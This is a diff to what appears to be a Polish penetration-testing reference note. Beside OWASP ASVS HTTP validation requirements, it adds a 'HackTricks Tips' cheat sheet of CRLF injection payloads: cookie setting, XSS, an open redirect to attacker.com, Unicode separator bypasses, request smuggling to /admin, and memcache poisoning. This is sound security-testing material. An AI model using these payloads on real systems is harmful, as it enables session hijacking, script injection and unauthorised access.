@@ -115,3 +115,18 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | V4.2.2 | HTTP Message Structure Validation | Verify that when generating HTTP messages, the Content-Length header field does not conflict with the length of the content as determined by the framing of the HTTP protocol, in order to prevent request smuggling attacks. |
 | V4.2.3 | HTTP Message Structure Validation | Verify that the application does not send nor accept HTTP/2 or HTTP/3 messages with connection-specific header fields such as Transfer-Encoding to prevent response splitting and header injection attacks. |
 | V4.2.4 | HTTP Message Structure Validation | Verify that the application only accepts HTTP/2 and HTTP/3 requests where the header fields and values do not contain any CR (\r), LF (\n), or CRLF (\r\n) sequences, to prevent header injection attacks. |
+
+
+---
+
+## HackTricks Tips
+
+### CRLF Injection
+
+- **Basic**: `/%0D%0ASet-Cookie:mycookie=myvalue`
+- **→ XSS**: `/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>`
+- **→ Open Redirect**: `/%0d%0aLocation:%20http://attacker.com`
+- **Unicode separatory (Java/Python/Go)**: `%E2%80%A8` (U+2028), `%E2%80%A9` (U+2029), `%C2%85` (U+0085)
+- **→ Request Smuggling**: inject `Connection: keep-alive\r\n\r\nGET /admin HTTP/1.1`
+- **Memcache injection**: unsanitized input w memcache requests → poison cache responses
+- **Tools**: CRLFsuite, crlfuzz
